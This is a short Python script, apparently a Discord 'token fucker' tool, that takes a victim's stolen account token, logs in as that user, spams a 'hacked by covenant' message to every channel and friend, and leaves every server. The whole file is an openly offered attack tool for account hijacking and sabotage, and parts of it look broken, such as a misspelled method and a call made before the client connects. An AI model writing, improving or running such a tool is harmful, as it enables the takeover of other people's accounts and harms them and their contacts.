from colorama import init, Fore
import discord
from discord.ext import commands

init()

def main():
    Token = input("{1}?){0} {2}Ingresa el token de la victima; {3}".format(Fore.RESET, Fore.LIGHTRED_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX))
    try:
        Client = discord.Client()
        
        @Client.event
        async def on_ready():
            for Guild in Client.guilds:
                for Channel in Guild.channels:
                    try:
                        await Channel.send("He sido hackeado por covenant")
                    except:
                        pass

                for Friend in Client.user.friends:
                    try:
                        await Friend.send("He sido hackeado por covenant")
                    except:
                        pass

                try:
                    await Guild.leave()
                except:
                    pass

        Client.user.greate_group([Client.user])
        Client.run(token=Token, bot=False)
    except:
        print("{1}!){0} {2}Token Invalido{0}".format(Fore.RESET, Fore.LIGHTRED_EX, Fore.LIGHTYELLOW_EX))
        main()

if __name__ == "__main__":
    print(Fore.LIGHTYELLOW_EX + r"""___________     __                         
\__    ___/___ |  | __ ____   ____         
  |    | /  _ \|  |/ // __ \ /    \        
  |    |(  <_> )    <\  ___/|   |  \       
  |____| \____/|__|_ \\___  >___|  /       
                    \/    \/     \/        
___________             __                 
\_   _____/_ __   ____ |  | __ ___________ 
 |    __)|  |  \_/ ___\|  |/ // __ \_  __ \
 |     \ |  |  /\  \___|    <\  ___/|  | \/
 \___  / |____/  \___  >__|_ \\___  >__|   
     \/              \/     \/    \/       
            """ + Fore.LIGHTCYAN_EX + "----- ARHOC -----\n")
    main()
